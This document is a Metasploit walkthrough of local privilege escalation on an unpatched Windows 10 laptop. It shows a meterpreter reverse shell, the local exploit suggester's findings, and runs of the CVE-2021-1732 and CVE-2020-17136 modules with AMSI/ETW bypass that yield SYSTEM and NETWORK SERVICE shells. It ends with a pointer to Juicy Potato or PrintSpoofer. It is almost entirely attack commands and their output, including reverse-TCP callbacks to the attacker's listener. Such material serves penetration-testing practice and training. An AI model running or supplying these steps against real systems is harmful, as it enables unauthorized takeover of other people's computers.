=====================================================================================================================================
Basic examples of local privilege escalation on an unpatched Windows 10 laptop using the Metasploit module 'local exploit suggester'
=====================================================================================================================================

> Target: an unpatched Windows 10 laptop
> Test of the local exploits: CVE-2021-1732 and CVE-2020-17136


=====================================================================================================================================
Step 1 -  We have a meterpreter reverse shell running on the Windows 10 laptop (with the low-privileged account 'auditor')
=====================================================================================================================================

msf6 exploit > sessions -i

Active sessions
===============

  Id  Name  Type                     Information                                Connection
  --  ----  ----                     -----------                                ----------
  1         meterpreter x64/windows  DESKTOP-6U70QND\auditor @ DESKTOP-6U70QND  192.168.1.11:9443 -> 192.168.1.41:65263 (192.168.1.41)


=====================================================================================================================================
Step 2 -  Run the Metasploit post-exploitation module 'local exploit suggester'
=====================================================================================================================================

msf6 > use post/multi/recon/local_exploit_suggester 

msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1

msf6 post(multi/recon/local_exploit_suggester) > run

[*] 192.168.1.41 - Collecting local exploits for x64/windows...
[*] 192.168.1.41 - 28 exploit checks are being tried...
[+] 192.168.1.41 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 192.168.1.41 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 192.168.1.41 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows 10 v1909 build detected!
[+] 192.168.1.41 - exploit/windows/local/cve_2020_0796_smbghost: The target appears to be vulnerable.
[+] 192.168.1.41 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 192.168.1.41 - exploit/windows/local/cve_2020_1313_system_orchestrator: The target appears to be vulnerable.
[+] 192.168.1.41 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 192.168.1.41 - exploit/windows/local/cve_2020_17136: The target appears to be vulnerable. A vulnerable Windows 10 v1909 build was detected!
[+] 192.168.1.41 - exploit/windows/local/cve_2021_1732_win32k: The target appears to be vulnerable.
[*] Post module execution completed


=====================================================================================================================================
Step 3 -  Escalate your privileges to become 'NT AUTHORITY\SYSTEM' using 1 or several local exploits
=====================================================================================================================================

===================================
Example 1 - CVE-2021-1732
===================================

msf6 > use exploit/windows/local/cve_2021_1732_win32k
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/local/cve_2021_1732_win32k) > options

Module options (exploit/windows/local/cve_2021_1732_win32k):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.11     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows 10 v1803-20H2 x64


msf6 exploit(windows/local/cve_2021_1732_win32k) > set SESSION 1
SESSION => 1

msf6 exploit(windows/local/cve_2021_1732_win32k) > run

[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Launching notepad to host the DLL...
[+] Process 3380 launched.
[*] Reflectively injecting the DLL into 3380...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (200262 bytes) to 192.168.1.41
[*] Meterpreter session 2 opened (192.168.1.11:4444 -> 192.168.1.41:56225) at 2021-08-14 02:07:09 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 888 created.
Channel 2 created.
Microsoft Windows [Version 10.0.18363.418]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\auditor\Documents> whoami
whoami
nt authority\system

C:\Users\auditor\Documents> hostname
hostname
DESKTOP-6U70QND

C:\Users\auditor\Documents>

C:\Users\auditor\Documents> exit    
exit

meterpreter > exit
[*] Shutting down Meterpreter...


===================================
Example 2 - CVE-2020-17136
===================================

msf6 > use exploit/windows/local/cve_2020_17136
[*] Using configured payload windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/local/cve_2020_17136) > set SESSION 1
SESSION => 1

msf6 exploit(windows/local/cve_2020_17136) > set LHOST 192.168.1.11
LHOST => 192.168.1.11

msf6 exploit(windows/local/cve_2020_17136) > options

Module options (exploit/windows/local/cve_2020_17136):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   AMSIBYPASS  true             yes       Enable Amsi bypass
   ETWBYPASS   true             yes       Enable Etw bypass
   SESSION     1                yes       The session to run this module on.
   WAIT        5                no        Time in seconds to wait

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.11     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows DLL Dropper


msf6 exploit(windows/local/cve_2020_17136) > run

[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. A vulnerable Windows 10 v1909 build was detected!
[*] Dropping payload dll at C:\Windows\Temp\YBogipLFmMDmtIgh.dll and registering it for cleanup...
[*] Running module against DESKTOP-6U70QND
[*] Launching notepad.exe to host CLR...
[+] Process 2740 launched.
[*] Reflectively injecting the Host DLL into 2740..
[*] Injecting Host into 2740...
[*] Host injected. Copy assembly into 2740...
[*] Assembly copied.
[*] Executing...
[*] Start reading output
[+] Sync connection key: 2054234935968
[+] Done
[*] End output.
[+] Execution finished.
[*] Sending stage (200262 bytes) to 192.168.1.41
[*] Meterpreter session 3 opened (192.168.1.11:4444 -> 192.168.1.41:56227) at 2021-08-14 02:11:32 +0200

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE

meterpreter > shell
Process 2612 created.
Channel 2 created.
Microsoft Windows [Version 10.0.18363.418]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

C:\Windows\system32> exit
exit

meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: The system cannot find the file specified. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
meterpreter > 


=> The next step would be to abuse the 'SeImpersonatePrivilege' to become 'nt authority\system' with the tool 'Juicy potato' or 'PrintSpoofer'.

